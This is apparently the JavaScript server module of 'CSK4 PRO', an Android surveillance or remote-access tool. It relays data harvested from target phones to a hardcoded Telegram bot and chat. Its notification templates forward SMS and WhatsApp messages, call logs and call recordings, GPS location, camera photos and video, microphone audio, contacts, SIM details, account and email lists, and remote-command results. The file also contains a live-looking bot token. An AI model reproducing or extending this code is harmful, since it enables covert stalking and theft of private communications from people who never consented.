// ============================================
// CSK4 PRO v4.0 - Telegram Bot Integration
// ============================================
// Ye file Telegram Bot se connect karti hai
// Aur instant notifications bhejti hai
// Email se FAST — 1-2 second mein
// ============================================

const TelegramBot = require('node-telegram-bot-api');

// ============ CONFIG ============
const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || 
  '8393657326:AAFvHQjOcbgKqcMpiFn8lQbZtc3VipPXUvI';

const CHAT_ID = process.env.TELEGRAM_CHAT_ID || 
  '8181910370';

// ============ STATE ============
let bot = null;
let isEnabled = false;
let messageQueue = [];
let isSending = false;

// ============ RATE LIMIT ============
const RATE_LIMIT = {
  maxPerMinute: 20,
  maxPerSecond: 1,
  sentThisMinute: 0,
  sentThisSecond: 0,
  minuteReset: Date.now(),
  secondReset: Date.now()
};

// ============ INITIALIZE BOT ============
function init() {
  if (!BOT_TOKEN || !CHAT_ID) {
    console.log('⚠️ Telegram not configured — skipping');
    return false;
  }

  try {
    bot = new TelegramBot(BOT_TOKEN, { 
      polling: false,  // We don't need to receive messages
      webHook: false
    });

    isEnabled = true;
    console.log('📱 Telegram Bot initialized');
    console.log(`   Chat ID: ${CHAT_ID}`);

    // Send startup message
    sendMessage('🟢 <b>CSK4 Server Started</b>\n\nServer is online and ready to receive data.');

    return true;
  } catch (error) {
    console.error('❌ Telegram init failed:', error.message);
    isEnabled = false;
    return false;
  }
}

// ============ RATE LIMIT CHECK ============
function canSend() {
  const now = Date.now();

  // Reset counters
  if (now - RATE_LIMIT.minuteReset > 60000) {
    RATE_LIMIT.sentThisMinute = 0;
    RATE_LIMIT.minuteReset = now;
  }
  if (now - RATE_LIMIT.secondReset > 1000) {
    RATE_LIMIT.sentThisSecond = 0;
    RATE_LIMIT.secondReset = now;
  }

  // Check limits
  if (RATE_LIMIT.sentThisMinute >= RATE_LIMIT.maxPerMinute) {
    return false;
  }
  if (RATE_LIMIT.sentThisSecond >= RATE_LIMIT.maxPerSecond) {
    return false;
  }

  RATE_LIMIT.sentThisMinute++;
  RATE_LIMIT.sentThisSecond++;
  return true;
}

// ============ SEND MESSAGE ============
async function sendMessage(text, options = {}) {
  if (!isEnabled || !bot) {
    console.log('⚠️ Telegram not enabled, skipping message');
    return false;
  }

  // Rate limit
  if (!canSend()) {
    console.log('⚠️ Telegram rate limit — queueing message');
    messageQueue.push({ text, options });
    processQueue();
    return false;
  }

  try {
    const result = await bot.sendMessage(CHAT_ID, text, {
      parse_mode: 'HTML',
      disable_web_page_preview: true,
      ...options
    });
    return true;
  } catch (error) {
    console.error('❌ Telegram send failed:', error.message);
    return false;
  }
}

// ============ PROCESS QUEUE ============
async function processQueue() {
  if (isSending || messageQueue.length === 0) return;
  isSending = true;

  while (messageQueue.length > 0) {
    if (!canSend()) {
      await new Promise(r => setTimeout(r, 2000));
      continue;
    }

    const msg = messageQueue.shift();
    try {
      await bot.sendMessage(CHAT_ID, msg.text, {
        parse_mode: 'HTML',
        disable_web_page_preview: true,
        ...msg.options
      });
    } catch (error) {
      console.error('❌ Queue send failed:', error.message);
    }
  }

  isSending = false;
}

// ============ SEND PHOTO ============
async function sendPhoto(photoUrl, caption = '') {
  if (!isEnabled || !bot) return false;
  if (!canSend()) return false;

  try {
    await bot.sendPhoto(CHAT_ID, photoUrl, {
      caption: caption,
      parse_mode: 'HTML'
    });
    return true;
  } catch (error) {
    console.error('❌ Telegram photo failed:', error.message);
    return false;
  }
}

// ============ SEND DOCUMENT (Audio/Video) ============
async function sendDocument(documentUrl, caption = '') {
  if (!isEnabled || !bot) return false;
  if (!canSend()) return false;

  try {
    await bot.sendDocument(CHAT_ID, documentUrl, {
      caption: caption,
      parse_mode: 'HTML'
    });
    return true;
  } catch (error) {
    console.error('❌ Telegram document failed:', error.message);
    return false;
  }
}

// ============ SEND AUDIO ============
async function sendAudio(audioUrl, caption = '') {
  if (!isEnabled || !bot) return false;
  if (!canSend()) return false;

  try {
    await bot.sendAudio(CHAT_ID, audioUrl, {
      caption: caption,
      parse_mode: 'HTML'
    });
    return true;
  } catch (error) {
    console.error('❌ Telegram audio failed:', error.message);
    return false;
  }
}

// ============ SEND LOCATION ============
async function sendLocation(lat, lng) {
  if (!isEnabled || !bot) return false;
  if (!canSend()) return false;

  try {
    await bot.sendLocation(CHAT_ID, lat, lng);
    return true;
  } catch (error) {
    console.error('❌ Telegram location failed:', error.message);
    return false;
  }
}

// ============ NOTIFICATION TEMPLATES ============

// 🆕 Device Online
async function notifyDeviceOnline(deviceName, deviceId, model, android, battery) {
  const text = `🟢 <b>Device Online</b>

📱 <b>Name:</b> ${escapeHtml(deviceName)}
🆔 <b>ID:</b> <code>${deviceId}</code>
📲 <b>Model:</b> ${escapeHtml(model)}
🤖 <b>Android:</b> ${android}
🔋 <b>Battery:</b> ${battery}%

⏰ ${new Date().toLocaleString()}`;
  
  return await sendMessage(text);
}

// 📍 Location Update
async function notifyLocation(deviceName, lat, lng, accuracy) {
  const mapsUrl = `https://maps.google.com/?q=${lat},${lng}`;
  const text = `📍 <b>Location Update</b>

📱 <b>Device:</b> ${escapeHtml(deviceName)}
🗺️ <b>Coordinates:</b> <code>${lat.toFixed(6)}, ${lng.toFixed(6)}</code>
🎯 <b>Accuracy:</b> ${accuracy ? Math.round(accuracy) + 'm' : 'N/A'}

<a href="${mapsUrl}">🗺️ Open in Maps</a>

⏰ ${new Date().toLocaleString()}`;
  
  return await sendMessage(text);
}

// 💬 New SMS
async function notifySMS(deviceName, from, body, senderName) {
  const displayFrom = senderName && senderName !== 'Unknown' 
    ? `${escapeHtml(senderName)} (${from})` 
    : from;
  
  const text = `💬 <b>New SMS</b>

📱 <b>Device:</b> ${escapeHtml(deviceName)}
👤 <b>From:</b> ${displayFrom}
📝 <b>Message:</b>
<i>${escapeHtml(body)}</i>

⏰ ${new Date().toLocaleString()}`;
  
  return await sendMessage(text);
}

// 💬 WhatsApp Message
async function notifyWhatsApp(deviceName, from, message) {
  const text = `💬 <b>WhatsApp Message</b>

📱 <b>Device:</b> ${escapeHtml(deviceName)}
👤 <b>From:</b> ${escapeHtml(from)}
📝 <b>Message:</b>
<i>${escapeHtml(message)}</i>

⏰ ${new Date().toLocaleString()}`;
  
  return await sendMessage(text);
}

// 🔔 Notification
async function notifyNotification(deviceName, appName, title, text) {
  const message = `🔔 <b>Notification</b>

📱 <b>Device:</b> ${escapeHtml(deviceName)}
📲 <b>App:</b> ${escapeHtml(appName)}
📌 <b>Title:</b> ${escapeHtml(title || 'No title')}
📝 <b>Text:</b> <i>${escapeHtml(text || 'No text')}</i>

⏰ ${new Date().toLocaleString()}`;
  
  return await sendMessage(message);
}

// 📞 Call
async function notifyCall(deviceName, number, name, type, duration) {
  const typeEmoji = {
    1: '📥', 2: '📤', 3: '❌', 4: '📮', 5: '🚫', 6: '⏱️'
  };
  const typeText = {
    1: 'Incoming', 2: 'Outgoing', 3: 'Missed', 4: 'Voicemail', 5: 'Rejected', 6: 'Blocked'
  };

  const text = `${typeEmoji[type] || '📞'} <b>Call ${typeText[type] || 'Event'}</b>

📱 <b>Device:</b> ${escapeHtml(deviceName)}
👤 <b>From:</b> ${escapeHtml(name || 'Unknown')}
📞 <b>Number:</b> <code>${number}</code>
⏱️ <b>Duration:</b> ${duration}s

⏰ ${new Date().toLocaleString()}`;
  
  return await sendMessage(text);
}

// 🆕 New Contact
async function notifyContact(deviceName, name, phone, type) {
  const text = `🆕 <b>New Contact</b>

📱 <b>Device:</b> ${escapeHtml(deviceName)}
👤 <b>Name:</b> ${escapeHtml(name)}
📞 <b>Phone:</b> <code>${phone}</code>
📱 <b>Type:</b> ${type || 'Mobile'}

⏰ ${new Date().toLocaleString()}`;
  
  return await sendMessage(text);
}

// 📷 Photo
async function notifyPhoto(deviceName, photoUrl) {
  const caption = `📷 <b>Photo Captured</b>

📱 <b>Device:</b> ${escapeHtml(deviceName)}
⏰ ${new Date().toLocaleString()}`;
  
  return await sendPhoto(photoUrl, caption);
}

// 🎥 Video
async function notifyVideo(deviceName, videoUrl) {
  const caption = `🎥 <b>Video Recorded</b>

📱 <b>Device:</b> ${escapeHtml(deviceName)}
⏰ ${new Date().toLocaleString()}`;
  
  return await sendDocument(videoUrl, caption);
}

// 🎤 Audio
async function notifyAudio(deviceName, audioUrl) {
  const caption = `🎤 <b>Audio Recorded</b>

📱 <b>Device:</b> ${escapeHtml(deviceName)}
⏰ ${new Date().toLocaleString()}`;
  
  return await sendAudio(audioUrl, caption);
}

// 🎙️ Call Recording
async function notifyCallRecording(deviceName, number, duration, audioUrl) {
  const caption = `🎙️ <b>Call Recording</b>

📱 <b>Device:</b> ${escapeHtml(deviceName)}
📞 <b>Number:</b> <code>${number}</code>
⏱️ <b>Duration:</b> ${duration}s

⏰ ${new Date().toLocaleString()}`;
  
  return await sendDocument(audioUrl, caption);
}

// 📊 Activity
async function notifyActivity(deviceName, type, data) {
  const text = `📊 <b>Activity: ${type}</b>

📱 <b>Device:</b> ${escapeHtml(deviceName)}
📋 <b>Data:</b> <code>${escapeHtml(JSON.stringify(data))}</code>

⏰ ${new Date().toLocaleString()}`;
  
  return await sendMessage(text);
}

// 🔋 Battery Alert
async function notifyBattery(deviceName, level, isCharging) {
  const emoji = isCharging ? '🔌' : (level <= 15 ? '🔴' : '🔋');
  const status = isCharging ? 'Charging' : 'On Battery';

  const text = `${emoji} <b>Battery Alert</b>

📱 <b>Device:</b> ${escapeHtml(deviceName)}
🔋 <b>Level:</b> ${level}%
⚡ <b>Status:</b> ${status}

⏰ ${new Date().toLocaleString()}`;
  
  return await sendMessage(text);
}

// 📱 SIM Info
async function notifySimInfo(deviceName, sims) {
  let simText = '';
  if (sims && sims.length > 0) {
    sims.forEach(sim => {
      simText += `\n<b>SIM ${sim.slot}:</b>\n`;
      simText += `  📞 ${sim.number || 'N/A'}\n`;
      simText += `  📡 ${sim.operator || 'N/A'}\n`;
      simText += `  📶 ${sim.networkType || 'N/A'}\n`;
    });
  }

  const text = `📱 <b>SIM Info</b>

📱 <b>Device:</b> ${escapeHtml(deviceName)}
${simText}

⏰ ${new Date().toLocaleString()}`;
  
  return await sendMessage(text);
}

// 👤 Accounts
async function notifyAccounts(deviceName, accounts) {
  let accText = '';
  if (accounts && accounts.length > 0) {
    accounts.forEach(acc => {
      accText += `\n📧 ${escapeHtml(acc.name)}\n  Type: ${acc.type}\n`;
    });
  }

  const text = `👤 <b>Accounts Found</b>

📱 <b>Device:</b> ${escapeHtml(deviceName)}
<b>Total:</b> ${accounts?.length || 0}
${accText}

⏰ ${new Date().toLocaleString()}`;
  
  return await sendMessage(text);
}

// 📧 Emails
async function notifyEmails(deviceName, emails) {
  let emailText = '';
  if (emails && emails.length > 0) {
    emails.forEach(email => {
      emailText += `\n📧 ${escapeHtml(email)}`;
    });
  }

  const text = `📧 <b>Email Accounts</b>

📱 <b>Device:</b> ${escapeHtml(deviceName)}
<b>Total:</b> ${emails?.length || 0}
${emailText}

⏰ ${new Date().toLocaleString()}`;
  
  return await sendMessage(text);
}

// 🎮 Command Result
async function notifyCommand(deviceName, command, result) {
  const text = `🎮 <b>Command Executed</b>

📱 <b>Device:</b> ${escapeHtml(deviceName)}
⚡ <b>Command:</b> <code>${command}</code>
✅ <b>Result:</b> ${escapeHtml(result)}

⏰ ${new Date().toLocaleString()}`;
  
  return await sendMessage(text);
}

// 🚨 System Alert
async function notifySystem(title, message) {
  const text = `🚨 <b>${escapeHtml(title)}</b>

${escapeHtml(message)}

⏰ ${new Date().toLocaleString()}`;
  
  return await sendMessage(text);
}

// ============ ESCAPE HTML ============
function escapeHtml(text) {
  if (!text) return '';
  return String(text)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');
}

// ============ TEST ============
async function test() {
  const success = await sendMessage('🧪 <b>Test Message</b>\n\nCSK4 Telegram Bot is working!');
  return success;
}

// ============ STATUS ============
function getStatus() {
  return {
    enabled: isEnabled,
    hasBot: !!bot,
    chatId: CHAT_ID,
    queueLength: messageQueue.length,
    sentThisMinute: RATE_LIMIT.sentThisMinute,
    sentThisSecond: RATE_LIMIT.sentThisSecond
  };
}

// ============ EXPORTS ============
module.exports = {
  init,
  sendMessage,
  sendPhoto,
  sendDocument,
  sendAudio,
  sendLocation,
  test,
  getStatus,
  
  // Notification templates
  notifyDeviceOnline,
  notifyLocation,
  notifySMS,
  notifyWhatsApp,
  notifyNotification,
  notifyCall,
  notifyContact,
  notifyPhoto,
  notifyVideo,
  notifyAudio,
  notifyCallRecording,
  notifyActivity,
  notifyBattery,
  notifySimInfo,
  notifyAccounts,
  notifyEmails,
  notifyCommand,
  notifySystem
};
